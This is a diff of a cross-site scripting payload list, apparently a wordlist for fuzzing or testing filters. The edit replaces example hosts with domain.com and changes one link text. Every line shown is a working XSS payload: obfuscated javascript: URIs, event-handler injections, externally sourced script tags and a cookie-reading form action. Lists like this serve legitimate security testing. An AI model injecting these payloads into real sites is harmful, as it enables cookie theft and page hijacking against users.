@@ -114,7 +114,7 @@ http://www.google<script .com>alert(document.location)</script
 <iframe/%00/ src=javaSCRIPT&colon;alert(1)
 //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
 /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
-//|\\ <script //|\\ src='https://www.cnn.com/u/13018058/js.js'> //|\\ </script //|\\
+//|\\ <script //|\\ src='https://www.domain.com/'> //|\\ </script //|\\
 </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
 <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
 </plaintext\></|\><plaintext/onmouseover=prompt(1)
@@ -123,10 +123,10 @@ http://www.google<script .com>alert(document.location)</script
 <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
 <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
 <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
-<embed src="http://www.cnn.com">
-<object data="http://www.cnn.com">
+<embed src="http://www.domain.com">
+<object data="http://www.domain.com">
 <var onmouseover="prompt(1)">On Mouse Over</var>
-<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>click</a>
 <img src="/" =_=" title="onerror='prompt(1)'">
 <%<!--'%><script>alert(1);</script -->
 <script src="data:text/javascript,alert(1)"></script>
